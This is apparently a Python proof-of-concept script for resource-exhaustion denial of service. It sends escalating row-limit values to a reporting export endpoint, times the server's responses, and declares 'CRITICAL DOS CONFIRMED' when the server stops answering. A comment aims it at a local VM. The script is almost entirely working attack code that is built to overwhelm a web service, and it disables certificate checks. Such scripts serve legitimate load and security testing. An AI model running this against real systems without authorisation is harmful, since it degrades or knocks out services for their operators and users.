import requests
import time
import sys

def verify_resource_exhaustion(base_url):
    print(r'''
    [*] Evaluating System Complexity Proportionality Matrix...
    ''')
    
    endpoint = base_url.rstrip('/') + "/api/v2/reporting/export"
    
    # Test increments: Linearly multiplying the requested workload data size
    workload_steps = [10, 100, 1000, 10000]
    
    for row_limit in workload_steps:
        params = {
            "format": "pdf",
            "compress": "true",
            "limit": row_limit  # User input altering database row lookup sizes directly
        }
        
        start_time = time.time()
        
        try:
            # Send the request and time the server response latency
            resp = requests.get(endpoint, params=params, timeout=45, verify=False)
            elapsed_time = time.time() - start_time
            
            print(f"[+] Workload Query Sent: limit={row_limit}")
            print(f"[+] HTTP Server Status: {resp.status_code}")
            print(f"[+] Total Processing Time logged: {elapsed_time:.2f} seconds")
            
            # Evaluate scaling factor flags
            if elapsed_time > 15.0:
                print(f"[!] Warning: Extreme execution lag discovered at limit={row_limit}.")
                print("    Resource processing load is growing disproportionately to input size.")
            
            print("-" * 50)
            
        except requests.exceptions.Timeout:
            print(f"[CRITICAL DOS CONFIRMED] Server completely frozen at limit={row_limit} (Timeout reached).")
            print("    The input size successfully overwhelmed the CPU thread pool architecture.")
            break
        except Exception as e:
            print(f"[-] Execution tracking interrupted: {e}")

if __name__ == "__main__":
    TARGET_ENVIRONMENT = "http://192.168.0.10:8080" # Test locally in your VM environment first
    verify_resource_exhaustion(TARGET_ENVIRONMENT)
